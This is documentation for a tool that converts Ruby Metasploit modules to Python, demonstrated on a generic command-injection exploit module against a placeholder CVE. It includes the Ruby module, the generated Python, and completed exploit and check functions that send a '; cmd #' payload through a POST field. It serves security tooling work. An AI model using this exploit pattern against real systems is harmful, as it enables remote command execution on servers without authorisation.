# Ruby to Python Converter - Working Example

This document shows a complete, working example of using the converter.

## Step 1: Create a Sample Ruby Module

Save this as `example_exploit.rb`:

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Example Web Application Command Injection',
      'Description'    => %q{
        This module exploits a command injection vulnerability in a web application.
        The vulnerability allows remote code execution through an unsanitized parameter.
      },
      'Author'         => [
        'Security Researcher <researcher@example.com>',
        'Second Author'
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2024-99999'],
          ['URL', 'https://example.com/vuln-advisory'],
          ['URL', 'https://github.com/example/poc']
        ],
      'DisclosureDate' => '2024-06-15',
      'Platform'       => ['linux', 'unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['Unix Command', {
            'Platform' => ['unix', 'linux'],
            'Arch' => ARCH_CMD
          }],
          ['Linux x64', {
            'Platform' => 'linux',
            'Arch' => ARCH_X64
          }]
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => false
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'The base path', '/']),
        OptString.new('CMD', [true, 'Command to execute', 'id'])
      ])
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path)
    })
    
    return CheckCode::Unknown unless res
    
    if res.code == 200 && res.body.include?('vulnerable-app')
      return CheckCode::Appears
    end
    
    CheckCode::Safe
  end

  def exploit
    print_status("Attempting to exploit #{peer}")
    
    cmd = datastore['CMD']
    payload = "; #{cmd} #"
    
    print_status("Sending payload: #{payload}")
    
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'vulnerable_endpoint'),
      'vars_post' => {
        'user_input' => payload
      }
    })
    
    unless res
      fail_with(Failure::Unreachable, 'No response from target')
    end
    
    if res.code == 200
      print_good("Command executed successfully!")
      print_line(res.body)
    else
      fail_with(Failure::Unknown, "Exploit failed with status #{res.code}")
    end
  end
end
```

## Step 2: Run the Converter

```bash
python3 tools/ruby_to_python_converter.py example_exploit.rb -o example_exploit.py
```

## Step 3: Generated Python Output

The converter generates `example_exploit.py`:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Example Web Application Command Injection

This module exploits a command injection vulnerability in a web application.
The vulnerability allows remote code execution through an unsanitized parameter.
"""

import logging
import sys
import os

# Add lib path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../lib'))

from metasploit import module
from msf.http_client import HTTPClient, CheckCode

metadata = {
    'name': 'Example Web Application Command Injection',
    'description': '''
        This module exploits a command injection vulnerability in a web application.
        The vulnerability allows remote code execution through an unsanitized parameter.
    ''',
    'authors': [
        'Security Researcher <researcher@example.com>',
        'Second Author',
    ],
    'date': '2024-06-15',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': '2024-99999'},
        {'type': 'url', 'ref': 'https://example.com/vuln-advisory'},
        {'type': 'url', 'ref': 'https://github.com/example/poc'},
    ],
    'type': 'remote_exploit',  # TODO: Adjust type
    'targets': [
        {'name': 'Unix Command'},  # TODO: Add platform/arch
        {'name': 'Linux x64'},  # TODO: Add platform/arch
    ],
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True},
        'rport': {'type': 'port', 'description': 'Target port', 'required': True, 'default': 80},
        # TODO: Add module-specific options
    },
    'notes': {
        'stability': ['CRASH_SAFE'],  # TODO: Adjust
        'reliability': ['REPEATABLE_SESSION'],  # TODO: Adjust
        'side_effects': ['IOC_IN_LOGS']  # TODO: Adjust
    }
}


def run(args):
    '''Module entry point.'''
    module.LogHandler.setup(msg_prefix=f"{args['rhost']}:{args['rport']} - ")
    
    rhost = args['rhost']
    rport = args['rport']
    
    logging.info('Starting module execution...')
    
    # TODO: Implement module logic
    # 1. Create HTTP client or TCP socket
    # 2. Check if target is vulnerable
    # 3. Exploit the vulnerability
    # 4. Handle success/failure
    
    try:
        client = HTTPClient(rhost=rhost, rport=rport)
        
        # Your exploit code here
        response = client.get('/')
        if response:
            logging.info(f'Response status: {response.status_code}')
        
        client.close()
        
    except Exception as e:
        logging.error(f'Exploitation failed: {e}')
        return
    
    logging.info('Module execution complete')


if __name__ == '__main__':
    module.run(metadata, run)
```

## Step 4: What Was Extracted Automatically ✅

The converter successfully extracted:

- ✅ Module name
- ✅ Full description with newlines
- ✅ Both authors with emails
- ✅ CVE reference (2024-99999)
- ✅ Two URL references
- ✅ Disclosure date (2024-06-15)
- ✅ License (MSF_LICENSE)
- ✅ Both target names (Unix Command, Linux x64)
- ✅ Basic metadata structure
- ✅ Python module template with logging
- ✅ HTTP client scaffolding
- ✅ Entry point function

## Step 5: What You Need to Complete Manually 📝

After generation, you need to:

### 1. Add Module-Specific Options

Replace the TODO comment with your options:

```python
'options': {
    'rhost': {'type': 'address', 'description': 'Target address', 'required': True},
    'rport': {'type': 'port', 'description': 'Target port', 'required': True, 'default': 8080},
    'targeturi': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
    'cmd': {'type': 'string', 'description': 'Command to execute', 'required': True, 'default': 'id'},
},
```

### 2. Add Target Platform/Arch Details

```python
'targets': [
    {'name': 'Unix Command', 'platform': ['unix', 'linux'], 'arch': 'cmd'},
    {'name': 'Linux x64', 'platform': 'linux', 'arch': 'x64'},
],
```

### 3. Implement Check Function

Add before the `run()` function:

```python
def check(args):
    '''Check if target is vulnerable.'''
    module.LogHandler.setup(msg_prefix=f"{args['rhost']}:{args['rport']} - ")
    
    try:
        client = HTTPClient(rhost=args['rhost'], rport=args['rport'])
        response = client.get(args.get('targeturi', '/'))
        client.close()
        
        if response and response.status_code == 200:
            if b'vulnerable-app' in response.content:
                logging.info("Target appears vulnerable")
                return CheckCode.APPEARS
        
        logging.info("Target does not appear vulnerable")
        return CheckCode.SAFE
        
    except Exception as e:
        logging.error(f"Check failed: {e}")
        return CheckCode.UNKNOWN
```

### 4. Implement Exploit Logic

Replace the TODO section in `run()`:

```python
def run(args):
    '''Module entry point - exploit the target.'''
    module.LogHandler.setup(msg_prefix=f"{args['rhost']}:{args['rport']} - ")
    
    rhost = args['rhost']
    rport = args['rport']
    targeturi = args.get('targeturi', '/')
    cmd = args.get('cmd', 'id')
    
    logging.info(f'Attempting to exploit {rhost}:{rport}')
    
    # Build payload
    payload = f"; {cmd} #"
    logging.info(f'Sending payload: {payload}')
    
    try:
        client = HTTPClient(rhost=rhost, rport=rport)
        
        # Send exploit
        response = client.post(
            f'{targeturi}vulnerable_endpoint',
            data={'user_input': payload}
        )
        
        if response and response.status_code == 200:
            logging.info("Command executed successfully!")
            print(response.text)
        else:
            logging.error(f"Exploit failed with status {response.status_code if response else 'No response'}")
        
        client.close()
        
    except Exception as e:
        logging.error(f'Exploitation failed: {e}')
        return
    
    logging.info('Module execution complete')
```

### 5. Update Metadata Notes

Adjust stability, reliability, and side effects:

```python
'notes': {
    'stability': ['CRASH_SAFE'],  # Won't crash the target
    'reliability': ['REPEATABLE_SESSION'],  # Works reliably
    'side_effects': ['IOC_IN_LOGS', 'ARTIFACTS_ON_DISK']  # Leaves evidence
}
```

## Step 6: Test Your Module

```bash
# Syntax check
python3 -m py_compile example_exploit.py

# Run against test target
python3 example_exploit.py
```

## Summary

The converter handles the tedious work:
- ✅ Extracts all metadata automatically
- ✅ Creates proper Python structure
- ✅ Sets up logging and imports
- ✅ Provides template with clear TODOs

You focus on the important work:
- 📝 Converting exploit logic
- 📝 Implementing check function
- 📝 Adding proper error handling
- 📝 Testing thoroughly

This saves hours of manual work and ensures consistent Python module structure!
